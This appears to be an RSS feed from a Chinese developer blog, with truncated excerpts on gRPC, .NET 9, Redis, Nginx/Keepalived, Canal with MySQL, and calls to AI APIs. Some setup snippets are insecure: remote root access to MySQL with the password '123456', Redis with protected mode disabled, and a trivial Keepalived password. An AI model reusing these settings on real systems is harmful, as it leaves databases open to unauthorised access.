gRPC 特点： 高效的数据交换：通过使用Protocol Buffers（Protobuf），gRPC能够以二进制形式序列化和反序列化数据，这比JSON或XML等文本格式更紧凑、更快。 双向流式通信：gRPC支持四种不同的调用类型：简单RPC、服务器端流式RPC、客户端流式RPC以及双向流式RPC。这使得开发者可以灵活选择最适合其应用场景的通信模式。 HTTP/2：gRPC基于HTTP/2构建，这意味着它可以利用HTTP/2提供的特性，如多路复用、头部压缩、流量控制等，来提高性能和可靠性。 跨平台支持：gRPC可以在多种环境中运行，包括云服务、本地部署、移动端等，并且对各种编程语言都有良好的支持，便于构建跨平台的应用程序。 插件系统：gRPC提供了一个插件系统，允许用户自定义代码生成逻辑，或者添加额外的功能，如认证、日志记录、监控等。 强大的社区和生态系统：由于它是Google的产品并且被广泛采用，因此拥有一个活跃的社区和丰富的第三方库与工具生态系统。
gRPC 场景： gRPC的使用场景非常广泛，尤其适用于需要高效、可靠和高性能通信的应用程序。以下是gRPC的一些典型使用场景：
1. 微服务架构 服务间通信：在微服务架构中，不同的服务可能使用不同的编程语言实现，并且需要高效地相互交流。gRPC以其跨语言支持和高效的二进制协议（Protocol Buffers），成为构建微服务之间通信层的理想选择。 负载均衡：gRPC原生支持客户端负载均衡，可以帮助分散请求到多个服务实例上，提高系统的可用性和性能。
2. 实时应用程序 双向流式通信：gRPC的双向流特性非常适合用于实时应用程序，如聊天应用、在线游戏、视频会议等，其中客户端和服务端需要持续地交换数据。 实时数据推送：对于需要从服务器向客户端推送实时更新的应用，例如股票行情、社交媒体通知、物联网设备状态更新等，gRPC的服务端流式RPC可以有效地实现这一需求。
3. 移动应用与后端通信 轻量级性能：由于其高效的序列化机制和较低的网络开销，gRPC特别适合移动应用与后端服务器之间的通信，特别是在网络条件不佳的情况下，能够减少电量消耗并提高响应速度。 快速开发：gRPC自动生成客户端和服务端代码的能力，大大简化了开发流程，尤其是在多平台开发环境中，减少了重复劳动。
4. 跨语言通信 多语言环境：gRPC支持多种编程语言，使得它非常适合用于跨语言通信的场景。不同团队或项目可以使用各自熟悉的技术栈，同时通过gRPC进行无缝集成。 异构系统集成：当需要将遗留系统与现代应用集成时，gRPC的跨语言能力可以帮助桥接这些系统，促进信息的流动和交互。
5. 分布式系统 节点间通信：在分布式系统中，各节点之间的通信是至关重要的。gRPC提供的高效率和可靠性使其成为分布式计算、任务分发、集群管理等场景下的首选通信框架。 数据同步：gRPC可以用来实现实时的数据同步，确保分布式系统中的所有节点都拥有最新的数据副本。
6. 容器化环境 服务发现：在Kubernetes等容器编排平台上，gRPC可以通过服务发现机制自动找到其他服务，简化了容器间的通信配置。 轻量级部署：gRPC的轻量级特性和对多语言的支持，使其非常适合容器化部署，有助于提升资源利用率和服务扩展性。
7. API后端服务 高性能API：许多大型互联网公司使用gRPC来构建其API后端服务，因为它提供了高性能、可扩展性和易于维护的方式来处理客户端请求。 类型安全：gRPC的IDL（接口定义语言）定义了严格的服务契约，保证了服务端和客户端之间的调用是类型安全的，减少了运行时错误的发生。
8. 物联网（IoT） 低资源消耗：gRPC的高效性能和紧凑的消息格式，使得它成为连接IoT设备和传感器的理想通信协议，能够在有限的计算和网络资源下提供可靠的通信。 实时监控与控制：gRPC的流式API非常适合用于实时监控和控制IoT设备，如智能家居系统、工业自动化等场景。
9. 大数据和机器学习 数据传输：在大数据处理和机器学习训练过程中，gRPC可以用来高效地传输大量数据，特别是当数据需要在不同的计算节点之间传递时。 模型服务：gRPC常被用于构建机器学习模型的服务化接口，允许客户端以高效的方式查询模型预测结果。 综上所述，gRPC是一个灵活且强大的通信框架，适用于各种需要高效、可靠通信的场景。无论是构建复杂的微服务架构，还是简单的客户端-服务器应用，gRPC都能提供显著的优势。
Node.js gRPC 创建和调用 gRPC 服务。包括服务器和客户端实现。
1. 安装必要的包 在项目目录下执行以下命令安装 gRPC 相关依赖：
npm install @grpc/grpc-js @grpc/proto-loader 2.</description></item><item><title>ASP.NET Core 9.0</title><link>https://qfsyso.github.io/posts/asp.net-core-9.0/</link><pubDate>Thu, 05 Dec 2024 21:56:25 +0000</pubDate><guid>https://qfsyso.github.io/posts/asp.net-core-9.0/</guid><description>.net9 引入了扩展类型特性，允许开发者扩展实例成员、静态成员以及属性成员，打破了以往只能通过静态类定义扩展方法的限制；params 关键字不再局限于数组类型，可与多种集合类型一起使用；新增 System.Threading.Lock 类型用于线程同步，改进了线程同步机制；异常处理速度大幅提升，环路性能也有所提高，动态 PGO 降低了类型检查成本，RyuJIT 编译器内联更通用的方法以减少方法调用开销等. linq新增了 CountBy 和 AggregateBy 方法，可通过键进行状态聚合，无需通过 GroupBy 进行中间分组，提高了数据查询的效率和灵活性. 引入了 CryptographicOperations 类型中的新的一次性哈希方法，支持最新的加密标准，并新增了一些加密相关的 API；强化了安全机制，如引入更强大的身份验证和授权机制，支持 OAuth 2.0 和 OpenID Connect 等，还通过 AI 驱动的安全功能实现实时威胁检测
Debian 12 安装.NET 9 添加 Microsoft 包签名密钥和包存储库： 打开终端，运行以下命令：
wget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.deb sudo dpkg -i packages-microsoft-prod.deb rm packages-microsoft-prod.deb 安装.NET SDK： 如果需要开发.NET 应用程序，可安装.NET SDK，运行以下命令：
sudo apt-get update &amp;amp;&amp;amp; \ sudo apt-get install -y dotnet-sdk-9.0 安装.NET 运行时： 如果只需要运行.NET 应用程序，可安装.NET 运行时。建议安装ASP.NET Core 运行时，因为它包含了.NET 和ASP.NET Core 运行时，在终端中运行以下命令：</description></item><item><title> Navigation</title><link>https://qfsyso.github.io/posts/navigation/</link><pubDate>Wed, 04 Dec 2024 19:31:51 +0000</pubDate><guid>https://qfsyso.github.io/posts/navigation/</guid><description> Study Tools AI Hexo Fun Game</description></item><item><title>jwt redis</title><link>https://qfsyso.github.io/posts/jwt-redis/</link><pubDate>Tue, 03 Dec 2024 01:20:03 +0000</pubDate><guid>https://qfsyso.github.io/posts/jwt-redis/</guid><description>Redis JWT 在 .NET 中使用 Redis 来存储 JWT（JSON Web Token）可以通过多种方式实现， 例如在用户登录时将生成的 JWT 存储在 Redis 中以便于后续验证和管理。
实现步骤
引入依赖 确保你的项目引入了以下必要的 NuGet 包：
Microsoft.AspNetCore.Authentication.JwtBearer：用于 JWT 身份验证。 StackExchange.Redis：用于与 Redis 通信。
dotnet add package Microsoft.AspNetCore.Authentication.JwtBearer dotnet add package StackExchange.Redis 配置 Redis 客户端 设置 Redis 的连接和操作。
生成 JWT 根据用户信息生成 JWT 并将其存储到 Redis。
验证 JWT 在验证阶段从 Redis 检查 token 是否有效。
实现 Token 的失效机制 利用 Redis 的 TTL（过期时间）特性来管理 token 的生命周期。
代码实现 1. 配置 Redis 客户端 在 Program.cs 或 Startup.</description></item><item><title>cashrp opencv</title><link>https://qfsyso.github.io/posts/cashrp-opencv/</link><pubDate>Tue, 03 Dec 2024 01:15:38 +0000</pubDate><guid>https://qfsyso.github.io/posts/cashrp-opencv/</guid><description>Emgu CV进行基本的人脸检测。 人脸检测是指定位图像中的人脸位置，而人脸识别是指确认或验证这些脸孔的身份。为了实现人脸识别，需要训练一个模型，或者使用预训练的模型。
安装 Emgu CV 首先，需要通过NuGet安装Emgu CV包。可以通过Visual Studio的NuGet包管理器来安装：
打开的C#项目。 右键点击解决方案资源管理器中的项目名称，选择“管理NuGet程序包”。
搜索并安装Emgu.CV和Emgu.CV.runtime.windows。 // 加载人脸检测分类器 CascadeClassifier faceCascade = new CascadeClassifier(&amp;#34;haarcascade_frontalface_default.xml&amp;#34;); // 读取输入图像 Image&amp;lt;Bgr, byte&amp;gt; inputImage = new Image&amp;lt;Bgr, byte&amp;gt;(&amp;#34;face.jpg&amp;#34;); // 转换为灰度图像，因为人脸检测通常在灰度图像上进行 Image&amp;lt;Gray, byte&amp;gt; grayImage = inputImage.Convert&amp;lt;Gray, byte&amp;gt;(); // 进行人脸检测 Rectangle[] faces = faceCascade.DetectMultiScale(grayImage, 1.1, 3, Size.Empty); // 在检测到的人脸周围绘制矩形框 foreach (Rectangle face in faces) { inputImage.Draw(face, new Bgr(0, 255, 0), 3); } // 保存标记后的图像为output.jpg inputImage.Save(&amp;#34;output.jpg&amp;#34;); Console.WriteLine(&amp;#34;save~output.jpg&amp;#34;); xml来自 https://github.com/opencv/opencv/tree/master/data/haarcascades
runtime 如果没有 Emgu.CV.runtime.windows 则会加载不了xml</description></item><item><title> DeepSeek-V2.5</title><link>https://qfsyso.github.io/posts/deepseek-v2.5/</link><pubDate>Sat, 30 Nov 2024 03:13:44 +0000</pubDate><guid>https://qfsyso.github.io/posts/deepseek-v2.5/</guid><description>DeepSeek-V2.5 在目前大模型主流榜单中，DeepSeek-V2.5 均表现出色
中文综合能力（AlignBench）位列开源榜首 与 GPT-4-Turbo，文心 4.0 等闭源模型在评测中处于同一梯队
英文综合能力（MT-Bench）处于第一梯队 英文综合能力（MT-Bench）与最强的开源模型 LLaMA3-70B 处于同一梯队，超过最强 MoE 开源模型 Mixtral8x22B
知识、数学、推理、编程等榜单结果位居前列 开源模型支持 128K 上下文
api curl https://api.deepseek.com/chat/completions \ -H &amp;#34;Content-Type: application/json&amp;#34; \ -H &amp;#34;Authorization: Bearer xx&amp;#34; \ -d &amp;#39;{ &amp;#34;model&amp;#34;: &amp;#34;deepseek-chat&amp;#34;, &amp;#34;messages&amp;#34;: [ {&amp;#34;role&amp;#34;: &amp;#34;system&amp;#34;, &amp;#34;content&amp;#34;: &amp;#34;You are a helpful assistant.&amp;#34;}, {&amp;#34;role&amp;#34;: &amp;#34;user&amp;#34;, &amp;#34;content&amp;#34;: &amp;#34;Hello!&amp;#34;} ], &amp;#34;stream&amp;#34;: false }&amp;#39; py # Please install OpenAI SDK first: `pip3 install openai` from openai import OpenAI client = OpenAI(api_key=&amp;#34;skx&amp;#34;, base_url=&amp;#34;https://api.</description></item><item><title>packet splicing</title><link>https://qfsyso.github.io/posts/packet-splicing/</link><pubDate>Wed, 27 Nov 2024 22:46:43 +0000</pubDate><guid>https://qfsyso.github.io/posts/packet-splicing/</guid><description>模拟粘包的场景 粘包通常在发送端因数据频繁写入缓冲区并一起发送，或者在接收端没有明确的分包逻辑导致读取不完整的数据包时发生。
使用固定分隔符或包头+包体 常见的解决粘包方案是使用分隔符（如 \n 或特殊字符），或采用固定的包头标识数据长度。
服务端代码
using System; using System.Net; using System.Net.Sockets; using System.Text; using System.Threading; class TcpServer { static void Main() { TcpListener listener = new TcpListener(IPAddress.Any, 5000); listener.Start(); Console.WriteLine(&amp;#34;Server started, waiting for connection...&amp;#34;); Socket clientSocket = listener.AcceptSocket(); Console.WriteLine(&amp;#34;Client connected!&amp;#34;); byte[] buffer = new byte[1024]; int bytesRead; while ((bytesRead = clientSocket.Receive(buffer)) &amp;gt; 0) { string receivedData = Encoding.UTF8.GetString(buffer, 0, bytesRead); Console.WriteLine($&amp;#34;Received: {receivedData}&amp;#34;); // 模拟数据未分包的场景 Console.WriteLine(&amp;#34;Processing received data...&amp;#34;); string[] messages = receivedData.</description></item><item><title>csharp reflection delegate</title><link>https://qfsyso.github.io/posts/csharp-reflection-delegate/</link><pubDate>Sun, 24 Nov 2024 17:36:50 +0000</pubDate><guid>https://qfsyso.github.io/posts/csharp-reflection-delegate/</guid><description>Reflection 反射 动态加载和创建对象： 反射可以在运行时加载程序集，并基于类型信息创建对象实例，而无需在编译时知道具体的类型。 这对于实现插件系统、动态加载模块或在不同版本的库之间提供兼容性非常有用。
反射可以获取有关类型（如类、接口、结构体等）及其成员（如字段、属性、方法等）的详细信息。 这对于生成文档、进行代码分析或创建序列化/反序列化机制等任务非常有用。
class Program { static void Main(string[] args) { // 加载包含类型的程序集 Assembly assembly = Assembly.LoadFrom(&amp;#34;ReflectionExample.dll&amp;#34;); // 获取类型信息 Type type = assembly.GetType(&amp;#34;ReflectionExample.MyClass&amp;#34;); // 创建对象实例 object instance = Activator.CreateInstance(type); // 获取方法信息 MethodInfo methodInfo = type.GetMethod(&amp;#34;MyMethod&amp;#34;); // 调用方法 methodInfo.Invoke(instance, new object[] { &amp;#34;Hello, Reflection!&amp;#34; }); } } public class MyClass { public void MyMethod(string message) { Console.WriteLine(message); } } Delegate 委托 委托是一种类型安全的函数指针，可以用来引用一个或多个具有相同签名的方法。 委托（Delegate）是一种特殊的类型，它代表对具有特定参数列表和返回类型的函数的引用。委托可以用来封装静态方法或实例方法，并且可以在运行时像普通变量一样传递。这使得委托成为一种强大的工具，用于实现回调函数、事件处理以及其他需要函数作为参数传递的场景。
委托的基本特性 类型安全：委托是类型安全的，因为它们在声明时会指定一个方法签名，只有与这个签名匹配的方法才能被委托引用。 多播能力：大多数委托支持多播，即一个委托实例可以引用多个方法。当调用该委托时，所有引用的方法都会被依次调用。 灵活性：委托可以用来引用类的实例方法或静态方法，也可以引用匿名方法（使用lambda表达式）。 定义委托 委托可以通过delegate关键字定义。定义时需要指定返回类型和参数列表。 有访问修饰符，delegate，返回值类型，委托名称，参数-可选。可以在类内部，可以在外部。</description></item><item><title>redis sentinel cluster</title><link>https://qfsyso.github.io/posts/redis-sentinel-cluster/</link><pubDate>Fri, 22 Nov 2024 22:18:29 +0000</pubDate><guid>https://qfsyso.github.io/posts/redis-sentinel-cluster/</guid><description>Debian 服务器上部署分布式 Redis 可以实现高可用性或负载均衡，具体可以选择以下两种方案之一：
主从复制 (Master-Slave Replication) 主从复制用于数据冗余备份和读写分离，但并不提供自动故障切换功能。
Redis Sentinel (哨兵模式) Redis Sentinel 在主从复制的基础上增加了自动故障切换功能，用于实现高可用性。
Redis Cluster (集群模式) Redis Cluster 是一种分布式部署方式，支持数据分片和高可用性，适用于需要扩展性的场景。
Redis Sentinel 部署架构 两台服务器： 主 Redis 服务器（假设 IP：192.168.1.101） 从 Redis 服务器（假设 IP：192.168.1.102） Sentinel 哨兵进程： 每台服务器运行一个 Sentinel 进程，用于监控和故障切换。
步骤 1：安装 Redis 在两台服务器上分别安装 Redis：
sudo apt update sudo apt install redis-server 验证 Redis 版本：
redis-server --version 步骤 2：配置 Redis 主从复制 在主服务器 (192.168.1.101) 上 编辑 Redis 配置文件 /etc/redis/redis.conf：
bind 0.0.0.0 # 允许外部访问 protected-mode no # 关闭保护模式（测试环境使用） appendonly yes # 开启持久化 启动 Redis 服务：</description></item><item><title> nginx keepalived</title><link>https://qfsyso.github.io/posts/nginx-keepalived/</link><pubDate>Thu, 21 Nov 2024 23:37:23 +0000</pubDate><guid>https://qfsyso.github.io/posts/nginx-keepalived/</guid><description>Keepalived 是一种用于实现高可用性的工具，它通过VRRP（虚拟路由冗余协议）来管理虚拟IP地址，从而确保在主服务器故障时，备用服务器能够接管服务。
环境准备 假设有两台Debian服务器：
Server 1 (Master): IP地址 192.168.1.100 Server 2 (Backup): IP地址 192.168.1.101 虚拟IP地址: 192.168.1.102
步骤一：安装Nginx 在两台服务器上安装Nginx。
Server 1 (Master)
sudo apt update sudo apt install nginx Server 2 (Backup)
sudo apt update sudo apt install nginx 步骤二：安装Keepalived 在两台服务器上安装Keepalived。
Server 1 (Master)
sudo apt install keepalived Server 2 (Backup) ```Bash sudo apt install keepalived 步骤三：配置Keepalived 编辑Keepalived的配置文件 /etc/keepalived/keepalived.conf。
Server 1 (Master)
sudo nano /etc/keepalived/keepalived.conf 添加以下配置：
vrrp_instance VI_1 { state MASTER interface eth0 virtual_router_id 51 priority 100 advert_int 1 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { 192.</description></item><item><title>python whoisdomain</title><link>https://qfsyso.github.io/posts/python-whoisdomain/</link><pubDate>Thu, 21 Nov 2024 23:31:52 +0000</pubDate><guid>https://qfsyso.github.io/posts/python-whoisdomain/</guid><description>pip install python-whois import whois # 读取文件中的域名 def read_domains_from_file(file_path): with open(file_path, &amp;#39;r&amp;#39;) as file: domains = [line.strip() for line in file if line.strip()] return domains # 查询域名的WHOIS信息 def query_whois(domain): try: domain_info = whois.whois(domain) if domain_info.domain_name: return domain_info else: return None except Exception as e: print(f&amp;#34;Error querying WHOIS for {domain}: {e}&amp;#34;) return None # 保存查询结果到文件 def save_results_to_file(domains, results, output_file): with open(output_file, &amp;#39;w&amp;#39;) as file: for domain, result in results.items(): if result: file.</description></item><item><title>uniapp postman</title><link>https://qfsyso.github.io/posts/uniapp-postman/</link><pubDate>Thu, 21 Nov 2024 21:43:36 +0000</pubDate><guid>https://qfsyso.github.io/posts/uniapp-postman/</guid><description>基础页面 &amp;lt;template&amp;gt; &amp;lt;view class=&amp;#34;content&amp;#34;&amp;gt; &amp;lt;input v-model=&amp;#34;url&amp;#34; placeholder=&amp;#34;请输入请求地址&amp;#34; /&amp;gt; &amp;lt;picker :range=&amp;#34;methods&amp;#34; @change=&amp;#34;onMethodChange&amp;#34;&amp;gt; &amp;lt;view&amp;gt;{{ methods[selectedIndex] }}&amp;lt;/view&amp;gt; &amp;lt;/picker&amp;gt; &amp;lt;textarea v-model=&amp;#34;body&amp;#34; placeholder=&amp;#34;请输入请求体&amp;#34;&amp;gt;&amp;lt;/textarea&amp;gt; &amp;lt;button @click=&amp;#34;sendRequest&amp;#34;&amp;gt;发送请求&amp;lt;/button&amp;gt; &amp;lt;view v-if=&amp;#34;response&amp;#34; class=&amp;#34;response&amp;#34;&amp;gt; &amp;lt;text&amp;gt;响应:&amp;lt;/text&amp;gt; &amp;lt;pre&amp;gt;{{ response }}&amp;lt;/pre&amp;gt; &amp;lt;/view&amp;gt; &amp;lt;/view&amp;gt; &amp;lt;/template&amp;gt; &amp;lt;script&amp;gt; export default { data() { return { url: &amp;#39;&amp;#39;, body: &amp;#39;&amp;#39;, response: &amp;#39;&amp;#39;, methods: [&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;], selectedIndex: 0 }; }, methods: { onMethodChange(e) { this.selectedIndex = e.detail.value; }, sendRequest() { const method = this.methods[this.selectedIndex]; const data = method === &amp;#39;POST&amp;#39; ?</description></item><item><title> XAI Grok</title><link>https://qfsyso.github.io/posts/xai-grok/</link><pubDate>Tue, 19 Nov 2024 22:54:15 +0000</pubDate><guid>https://qfsyso.github.io/posts/xai-grok/</guid><description>X.AI Reg
Create API key curl https://api.x.ai/v1/chat/completions -H &amp;#34;Content-Type: application/json&amp;#34; -H &amp;#34;Authorization: Bearer xai-xxx&amp;#34; -d &amp;#39;{ &amp;#34;messages&amp;#34;: [ { &amp;#34;role&amp;#34;: &amp;#34;system&amp;#34;, &amp;#34;content&amp;#34;: &amp;#34;You are a test assistant.&amp;#34; }, { &amp;#34;role&amp;#34;: &amp;#34;user&amp;#34;, &amp;#34;content&amp;#34;: &amp;#34;what can u do?&amp;#34; } ], &amp;#34;model&amp;#34;: &amp;#34;grok-beta&amp;#34;, &amp;#34;stream&amp;#34;: false, &amp;#34;temperature&amp;#34;: 0 }&amp;#39; python import requests # API URL 和 API 密钥 API_URL = &amp;#34;https://api.x.ai/v1/chat/completions&amp;#34; API_KEY = &amp;#34;xai-bELnXX&amp;#34; # 替换为实际 API 密钥 # 请求头 headers = { &amp;#34;Content-Type&amp;#34;: &amp;#34;application/json&amp;#34;, &amp;#34;Authorization&amp;#34;: f&amp;#34;Bearer {API_KEY}&amp;#34; } # 请求数据 data = { &amp;#34;messages&amp;#34;: [ { &amp;#34;role&amp;#34;: &amp;#34;system&amp;#34;, &amp;#34;content&amp;#34;: &amp;#34;You are a test assistant.</description></item><item><title>canal mysql auto bak</title><link>https://qfsyso.github.io/posts/canal-mysql-auto-bak/</link><pubDate>Sun, 17 Nov 2024 23:28:55 +0000</pubDate><guid>https://qfsyso.github.io/posts/canal-mysql-auto-bak/</guid><description>Canal 是阿里巴巴开源的一个数据库binlog解析工具，它能够捕获并解析MySQL等数据库的增量数据变化（即binlog），然后将这些变化的数据以消息的形式发送给其他系统或服务，如Elasticsearch、HBase、Redis等。这样做的好处是可以实现数据的实时同步，保证不同存储系统之间的数据一致性。
Canal的设计理念主要是基于数据库的增量订阅与消费模式，它通过模拟MySQL的slave来实现对MySQL主库binlog的监听，当主库有数据更新时，Canal能及时捕捉到这些变化，并将变化的数据按照一定的格式输出，供下游系统消费使用。
使用Canal的主要优势包括： 实时性 Canal通过模仿MySQL的slave节点行为，向MySQL master节点发送dump协议请求，以获取binlog日志8。这种方法使得Canal能够以较低的延迟捕获到数据库的变化，从而实现实时的数据同步。对于需要保持数据最新性的应用场景，如搜索引擎的索引更新或缓存系统的数据刷新，这一特性尤为重要。
解耦 Canal作为一个独立的服务，充当了数据库和数据消费者之间的中介角色。它不仅减少了直接连接数据库带来的性能压力，还避免了因数据库结构或数据模型变更导致的下游系统适配问题。这种解耦机制增强了系统的灵活性和可维护性，使得各个组件可以独立发展而不相互干扰18。
灵活性 Canal支持多种数据输出格式，包括但不限于JSON、XML等，这使得它可以很容易地与其他数据处理工具和服务集成。此外，Canal还提供了对Kafka、RocketMQ等消息队列的支持，这意味着数据不仅可以被同步到不同的存储系统，还可以被发送到消息队列中，供更多的应用和服务消费14。
除了上述提到的优点外，Canal还具备以下特点：
**高性能：**经过优化的Canal能够在高并发环境下保持稳定的性能表现，适合大规模数据同步场景。 **低延迟：**通过高效的日志解析和数据传输机制，Canal能够确保数据从源头到目的地的传输延迟尽可能低。 **高可用性：**Canal支持集群部署，结合Zookeeper等协调服务，可以实现故障自动切换，保证服务的连续性和稳定性21。 **安全性：**Canal可以通过配置SSL/TLS加密通信，保护数据在传输过程中的安全18。
应用场景 Canal的应用场景非常广泛，包括但不限于：
**数据同步：**将MySQL数据库的数据同步到Elasticsearch、Redis等其他存储系统，用于构建搜索引擎、缓存层等18。 **数据备份：**定期或实时备份MySQL数据库的数据，用于灾难恢复或数据归档18。 **数据集成：**在微服务架构中，使用Canal将多个数据库中的数据进行集成，提供统一的数据视图18。 **数据监控：**通过监听数据库的变化，及时发现异常操作或潜在的安全风险18。 Canal是一个功能强大、灵活多变的数据同步工具，它在保证数据实时性和一致性的基础上，提供了丰富的特性和广泛的应用场景，是现代数据驱动应用的理想选择。
Canal环境准备 设置MySQL远程访问
grant all privileges on *.* to &amp;#39;root&amp;#39;@&amp;#39;%&amp;#39; identified by &amp;#39;123456&amp;#39;; flush privileges; MySQL配置
Canal的原理基于MySQL binlog技术，所以，要想使用Canal就要开启MySQL的binlog写入功能，建议配置binlog的模式为row。
可以在MySQL命令行输入如下命令来查看binlog的模式。
SHOW VARIABLES LIKE &amp;#39;binlog_format&amp;#39;; 如果MySQL中默认的binlog格式为STATEMENT，需要将STATEMENT修改为ROW。修改/etc/my.cnf文件。
/etc/my.cnf 在[mysqld]下面新增如下三项配置。
log-bin=mysql-bin #开启MySQL二进制日志 binlog_format=ROW #将二进制日志的格式设置为ROW server_id=1 #server_id需要唯一，不能与Canal的slaveId重复 修改完my.cnf文件后，需要重启MySQL服务。
service mysqld restart 再次查看binlog模式。
SHOW VARIABLES LIKE &amp;#39;binlog_format&amp;#39;; MySQL创建用户授权
Canal的原理是模式自己为MySQL Slave，所以一定要设置MySQL Slave的相关权限。这里，需要创建一个主从同步的账户，并且赋予这个账户相关的权限。
CREATE USER canal@&amp;#39;localhost&amp;#39; IDENTIFIED BY &amp;#39;canal&amp;#39;; GRANT SELECT, REPLICATION SLAVE, REPLICATION CLIENT ON *.</description></item><item><title> .NET MemoryPack</title><link>https://qfsyso.github.io/posts/.net-memorypack/</link><pubDate>Thu, 14 Nov 2024 00:57:37 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-memorypack/</guid><description>MemoryPack 是一个高效的数据序列化库，它专注于性能优化，适用于需要快速序列化和反序列化的场景。这个库是由 Yuki Yogo 开发的，并且在 .NET 社区中获得了相当的关注。MemoryPack 支持零拷贝（zero-copy）读取，这意味着可以在不需要额外内存分配的情况下直接从原始字节数据中读取值。
MemoryPack使用示例，包括定义一个可序列化的类、序列化对象以及反序列化回对象的过程。
安装 MemoryPack 首先，需要安装 MemoryPack 库。可以通过 NuGet 包管理器来安装：
dotnet add package MemoryPack 或者在 Visual Studio 中使用 NuGet 包管理器界面来安装。
定义可序列化的类 为了使一个类能够被 MemoryPack 序列化，需要为该类添加 [MemoryPackable] 属性，并为类中的每个字段或属性添加 [MemoryPackIgnore] 属性（如果想要忽略某些字段或属性的话）。这里有一个简单的例子：
using System; using MemoryPack; [MemoryPackable] public partial class Person { public string Name { get; set; } public int Age { get; set; } [MemoryPackIgnore] public string NotSerializedProperty { get; set; } } 注意：partial 关键字是必须的，因为 MemoryPack 在编译时会生成一些额外的代码来支持序列化/反序列化。</description></item><item><title>.NET ILogger</title><link>https://qfsyso.github.io/posts/.net-ilogger/</link><pubDate>Thu, 14 Nov 2024 00:55:06 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-ilogger/</guid><description>ILogger 是 ASP.NET Core 中的一个接口，用于记录应用程序的日志信息。它是一个泛型接口，其中 T 是日志记录的上下文类型。通常情况下，会使用 ILogger 接口而不是 ILogger，除非需要将特定的上下文类型传递给日志记录器。
ILogger 的示例：
1. 注入 ILogger 在的控制器、服务或其他依赖注入组件中，可以注入 ILogger 或 ILogger。例如，在控制器中注入 ILogger：
public class YourController : ControllerBase { private readonly ILogger&amp;lt;YourController&amp;gt; _logger; public YourController(ILogger&amp;lt;YourController&amp;gt; logger) { _logger = logger; } // ... } 或者，如果不需要特定的上下文类型，可以注入 ILogger：
public class YourService { private readonly ILogger _logger; public YourService(ILogger logger) { _logger = logger; } // ... } 2. 记录日志 使用 _logger 对象记录不同级别的日志，例如：
_logger.LogInformation(&amp;#34;This is an information message.</description></item><item><title>Bogus-.NET Fake Data</title><link>https://qfsyso.github.io/posts/bogus-.net-fake-data/</link><pubDate>Sun, 10 Nov 2024 21:09:29 +0000</pubDate><guid>https://qfsyso.github.io/posts/bogus-.net-fake-data/</guid><description>Bogus 快速生成模拟数据 适用于单元测试、原型设计、演示数据准备。
1.NuGet 安装 Bogus 2.简单使用 var faker = new Faker(); // var faker = new Faker(&amp;#34;zh_CN&amp;#34;); ////中文 Console.WriteLine($&amp;#34;Name: {faker.Name.FullName()}&amp;#34;); Console.WriteLine($&amp;#34;Email: {faker.Internet.Email()}&amp;#34;); Console.WriteLine($&amp;#34;Phone: {faker.Phone.PhoneNumber()}&amp;#34;); Console.WriteLine($&amp;#34;Address: {faker.Address.FullAddress()}&amp;#34;); Console.WriteLine($&amp;#34;Company: {faker.Company.CompanyName()}&amp;#34;); Console.WriteLine($&amp;#34;Catch Phrase: {faker.Company.CatchPhrase()}&amp;#34;); Console.WriteLine($&amp;#34;BS: {faker.Company.Bs()}&amp;#34;); Console.WriteLine($&amp;#34;Product: {faker.Commerce.Product()}&amp;#34;); Console.WriteLine($&amp;#34;Price: {faker.Commerce.Price()}&amp;#34;); Console.WriteLine($&amp;#34;Credit Card: {faker.Finance.CreditCardNumber()}&amp;#34;); Console.WriteLine($&amp;#34;Bitcoin Address: {faker.Finance.BitcoinAddress()}&amp;#34;); Console.WriteLine($&amp;#34;User Agent: {faker.Internet.UserAgent()}&amp;#34;); Console.WriteLine($&amp;#34;Color: {faker.Commerce.Color()}&amp;#34;); Console.WriteLine($&amp;#34;Time Zone: {faker.Date.TimeZoneString()}&amp;#34;); 3.自定义类使用 public class TUser { public int Id { get; set; } public string FirstName { get; set; } public string LastName { get; set; } public string Email { get; set; } public DateTime Birth { get; set; } } //模拟数据 var faker = new Faker&amp;lt;TUser&amp;gt;().</description></item><item><title>.NET WatchDog</title><link>https://qfsyso.github.io/posts/.net-watchdog/</link><pubDate>Sat, 09 Nov 2024 00:01:03 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-watchdog/</guid><description>WatchDog 是一个开源（MIT License）、免费的实时应用监控系统，它可以实时记录并查看应用中的消息、事件、HTTP 请求和响应，以及运行时捕获的异常。
功能特点 实时日志记录：能够实时记录HTTP请求、响应以及运行时捕获的异常。 代码内日志记录：支持在代码中记录消息和事件。 日志搜索功能：支持对HTTP请求和异常日志进行搜索。 HTTP日志筛选：可根据HTTP方法和状态码筛选HTTP日志。 报警通知：支持通过邮件、短信等多种方式发送报警通知，确保能够及时得到反馈。 灵活配置：可以根据应用需求进行灵活的配置，适应不同的监控需求。 使用正则表达式黑名单 ：新增了使用正则表达式进行黑名单过滤的功能。
工作原理 WatchDog 利用 SignalR 实现了实时监控，并使用LiteDb作为无需配置的类似MongoDB的服务器端数据库，同时也支持使用外部数据库（如MSSQL、MySQL、PostgreSQL、MongoDB）。
使用 WatchDog 首先，在项目中安装 WatchDog 包。
NuGet 包管理器中安装： dotnet add package WatchDog 在 Startup.cs 中配置 WatchDog： 在 ConfigureServices 方法中添加 WatchDog：
public void ConfigureServices(IServiceCollection services) { services.AddControllers(); // 添加 WatchDog 服务 services.AddWatchDogServices(); } 然后，在 Configure 方法中配置它：
public void Configure(IApplicationBuilder app, IWebHostEnvironment env) { if (env.IsDevelopment()) { app.UseDeveloperExceptionPage(); } app.UseHttpsRedirection(); app.UseRouting(); app.UseAuthorization(); app.UseEndpoints(endpoints =&amp;gt; { endpoints.</description></item><item><title> Node Swagger</title><link>https://qfsyso.github.io/posts/node-swagger/</link><pubDate>Thu, 07 Nov 2024 00:37:19 +0000</pubDate><guid>https://qfsyso.github.io/posts/node-swagger/</guid><description>Node.js 和 Swagger 创建简单增删改查 (CRUD) API ， 使用 Express 作为 Web 框架，并集成 Swagger UI 来自动生成 API 文档。
mkdir node-swagger-crud cd node-swagger-crud npm init -y npm install express swagger-jsdoc swagger-ui-express 2: 设置 Express 应用 创建一个文件 app.js，用于定义 Express 应用及基本路由。
